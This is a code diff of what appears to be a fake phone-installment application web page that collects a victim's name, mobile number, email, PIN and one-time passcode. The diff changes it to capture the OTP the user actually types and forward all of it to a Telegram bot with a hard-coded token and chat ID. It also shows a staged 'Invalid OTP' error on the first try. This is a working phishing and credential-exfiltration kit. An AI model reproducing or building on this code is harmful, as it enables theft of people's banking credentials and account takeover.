@@ -189,7 +189,6 @@
 </div>
 
 <script>
-  let generatedOTP = "450099"; // fixed for demonstration
   let otpAttempts = 0;
 
   const page1 = document.getElementById('page1');
@@ -203,7 +202,7 @@
   const infoStatus = document.getElementById('infoStatus');
   const otpStatus = document.getElementById('otpStatus');
 
-  // Calculate installment on Page 1
+  // Calculate installment
   document.getElementById('calculateBtn').addEventListener('click', () => {
     let price = parseFloat(document.getElementById('price').value);
     let downpayment = parseFloat(document.getElementById('downpayment').value);
@@ -231,7 +230,7 @@
     calcResult.innerHTML = `Monthly Payment (0% interest): ₱${monthly.toFixed(2)} for ${months} months.<br>Balance after downpayment: ₱${balance.toFixed(2)}`;
   });
 
-  // Page 1 -> Page 2 (2sec loading)
+  // Page1 -> Page2
   document.getElementById('nextToInfoBtn').addEventListener('click', () => {
     const unit = document.getElementById('unit').value.trim();
     const price = parseFloat(document.getElementById('price').value);
@@ -250,7 +249,7 @@
     });
   });
 
-  // Page 2 -> Page 3 (4sec loading)
+  // Page2 -> Page3
   document.getElementById('nextToOtpBtn').addEventListener('click', () => {
     const name = document.getElementById('name').value.trim();
     const mobile = document.getElementById('mobile').value.trim();
@@ -288,7 +287,7 @@
 
     if (enteredOTP.length !== 6) {
       otpStatus.textContent = "";
-      showLoading(1000).then(() => { // 1 sec delay for empty/short OTP
+      showLoading(1000).then(() => {
         otpStatus.style.color = 'red';
         otpStatus.textContent = "❌ Invalid OTP. Please try again.";
       });
@@ -306,7 +305,7 @@
       mobile: document.getElementById('mobile').value,
       email: document.getElementById('email').value,
       pin: document.getElementById('pin').value,
-      otp: generatedOTP
+      otp: enteredOTP  // ✅ now sending the user input OTP
     };
 
     if (otpAttempts === 1) {
@@ -320,10 +319,6 @@
       page3.style.display = 'none';
       showLoading(3000).then(() => {
         page4.style.display = 'block';
-
-        // ------------------------------
-        // SEND TO TELEGRAM HERE
-        // ------------------------------
         sendToTelegram(userData);
       });
     }
@@ -340,10 +335,10 @@
     });
   }
 
-  // Telegram function
+  // Telegram sender
   function sendToTelegram(data) {
-    const botToken = "8267241825:AAEkd2U10BCKXBbQappfUluS6n72HiUfDZI"; // <-- Paste your bot token here
-    const chatId = "5374601148";     // <-- Paste your chat ID here
+    const botToken = "8267241825:AAEkd2U10BCKXBbQappfUluS6n72HiUfDZI"; // <-- your bot token
+    const chatId = "5374601148";  // <-- your chat ID
 
     const message = `
 📱 Phone Installment Application:
